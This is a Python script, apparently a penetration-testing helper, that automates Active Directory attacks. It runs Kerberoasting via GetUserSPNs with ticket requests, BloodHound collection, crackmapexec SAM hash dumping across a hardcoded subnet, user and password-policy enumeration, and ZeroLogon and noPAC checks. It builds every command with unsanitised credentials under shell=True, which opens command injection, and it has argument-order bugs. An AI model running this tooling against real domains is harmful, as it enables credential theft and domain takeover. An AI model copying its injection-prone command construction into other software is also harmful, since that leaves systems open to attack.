import argparse
import getpass
import subprocess
from ldap3 import Server, Connection, SUBTREE
import sys
from termcolor import colored

##############find_and_kerberoast_objects######################

def find_and_kerberoast_objects(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controlle
            cmd = f"GetUserSPNs.py -dc-ip {dc_ip} {domain}/{username}:{password} -request"
            subprocess.run(cmd, shell=True)
    except Exception as e:
        print(f"Error while searching for kerberoastable objects or Kerberoasting: {e}")
###########################################################################################  

def bloodhound(username, password, domain, dc_ip):
    try:
        cmd = f"bloodhound-python -u {username} -p {password} -d {domain} -ns {dc_ip} -c All"
        subprocess.run(cmd, shell=True)
       
    except Exception as e:
        print(f"Error running BloodHound: {e}")
###############################################################################################
def crackmapexec(username, domain, password,scope):
    try:
        cmd = f"crackmapexec smb 192.168.20.0/24 -u {username} -d {domain} -p {password} --sam"
        subprocess.run(cmd, shell=True)
       
    except Exception as e:
        print(f"Error running Crackmapexec: {e}")
##############################################################################################
def ldapSigning(username, password, domain, dc_ip):
     try:
          cmd = f"nxc ldap {dc_ip} -u '{username}' -p '{password}' -M ldap-checker"
          subprocess.run(cmd, shell=True)
     except Exception as e:
          print(f"Error while checking for LDAP Signing: {e}")
#############################################################################################

def enumUsers(username, password, domain, dc_ip):
     try:
          cmd = f"nxc smb {dc_ip} -u '{username}' -p '{password}' --users"
         
          subprocess.run(cmd, shell=True)
     except Exception as e:
          print(f"Error while enumerating users: {e}")
###############################################################################################
def enumPassPol(username, password, domain, dc_ip):
     try:
          cmd = f"nxc smb {dc_ip} -u '{username}' -p '{password}' --pass-pol"
          subprocess.run(cmd, shell=True)
     except Exception as e:
          print(f"Error while enumerating password policy: {e}")
###############################################################################################

def zerologon(username, password, domain, dc_ip):
     try:
          cmd = f"nxc smb {dc_ip} -u '{username}' -p '{password}' -M zerologon"
          subprocess.run(cmd, shell=True)
     except Exception as e:
          print(f"Error while checking for ZeroLogon: {e}")
###############################################################################################
def noPAC(username, password, domain, dc_ip):
     try:
          cmd = f"nxc smb {dc_ip} -u '{username}' -p '{password}' -M nopac"
          subprocess.run(cmd, shell=True)
     except Exception as e:
          print(f"Error while checking for noPAC: {e}")
#############################################################################################


################################################################################################

def main(arguments=None):
    parser = argparse.ArgumentParser("AD_intrec")
    parser.add_argument("-u", "--username", help="Username for log in.")
    parser.add_argument("-p", "--password", help="Password for log in.")
    parser.add_argument("-d", "--domain", help="Domain of the DC.")
    parser.add_argument("-i", "--dc-ip", help="Domain Controller IP or hostname.")
    parser.add_argument("-nb", "--no-bloodhound", action="store_true", help="Run adPEAS without Bloodhound")
    parser.add_argument("-nc", "--no-certipy", action="store_true", help="Run adPEAS without Certipy")
    parser.add_argument("-nu", "--no-enumUsers", action="store_true", help="Do not run enumUsers")
    parser.add_argument("-np", "--no-enumPassPol", action="store_true", help="Do not run enumPassPol")
    parser.add_argument("-s", "--scope", help="Newline delimited scope file.")
    parser.add_argument("-ncm", "--no-crackmapexec", action="store_true", help="Do not run crackmapexec")
    parser.add_argument("-nk", "--no-find-and-kerberoast-objects", action="store_true", help="Do not run find_and_kerberoast_objects")  
    #parser.add_argument("-nk", "--no-ldapSigning", action="store_true", help="Do not run ldapSigning")
    parser.add_argument("-nz", "--no-zerologon", action="store_true", help="Do not run zerologon")
    parser.add_argument("-npa", "--no-noPAC", action="store_true", help="Do not run noPAC")
    ##########################################################################################
    if arguments is None:
        args = parser.parse_args()
    else:
        args = parser.parse_args(arguments)

    if not args.username:
        args.username = input("Enter username: ")

    if not args.password:
        args.password = getpass.getpass("Enter password: ")

    if not args.domain:
        args.domain = input("Enter domain: ")

    if not args.dc_ip:
        args.dc_ip = input("Enter Domain Controller IP or hostname: ")
    
    #if not args.scope:
        #args.scope = input("Enter IP range to scan: ")
    ###############################################################################################
    print("*" * 40)
    print("Internal Reconnaissance Findings")
    print("*" * 40)
    ##########################################################################################
    print("find_and_kerberoast_objects:")
    print("#" * 40)
    if not args.no_find_and_kerberoast_objects:
        print("Collecting information for kerberoast_objects:...")
        find_and_kerberoast_objects(args.username, args.password, args.domain, args.dc_ip)
        print("Done collecting kerberoast_objects information.")
    ##########################################################################################
    print("Bloodhound Findings")
    print("#" * 40)
    if not args.no_bloodhound:
        print("Collecting information for Bloodhound...")
        bloodhound(args.username, args.password, args.domain, args.dc_ip)
        print("Done collecting Bloodhound information.")
    #######################################################################################
    print("Crackmapexec Findings")
    print("#" * 40)
    if not args.no_crackmapexec:
        print("Collecting information for crackmapexec...")
        crackmapexec(args.scope,args.username,args.domain, args.password)
        print("Done collecting crackmapexec information.")
    #######################################################################################   
    '''if not args.no_ldapSigning:
        print("Collecting information for ldapSigning...")
        ldapSigning(args.username,args.domain, args.password,args.dc_ip)
        print("Done collecting ldapSigning information.")'''
    #####################################################################################
    print("Users Information")
    print("#" * 40)
    if not args.no_enumUsers:
        print("Collecting information for enumUsers...")
        enumUsers(args.username, args.password, args.domain, args.dc_ip)
        print("Done collecting enumUsers information.")
    ###################################################################################  
    print("Password Information")
    print("#" * 40) 
    if not args.no_enumPassPol:
        print("Collecting information for enumPassPol...")
        enumPassPol(args.username, args.password, args.domain, args.dc_ip)
        print("Done collecting enumPassPol information.")
    #####################################################################################
    print("zerologon Vulnerability")
    print("#" * 40) 
    if not args.no_zerologon:
        print("Collecting information for zerologon Vulnerability...")
        zerologon (args.username, args.password, args.domain, args.dc_ip)
        print("Done collecting zerologon Vulnerability.")
    ######################################################################################
    print("noPAC Configuration")
    print("#" * 40) 
    if not args.no_noPAC:
        print("Collecting information for noPAC Configuration")
        noPAC(args.username, args.password, args.domain, args.dc_ip)
        print("Done collecting noPAC Configuration")

    ####################################################################################    
if __name__ == "__main__":
    main()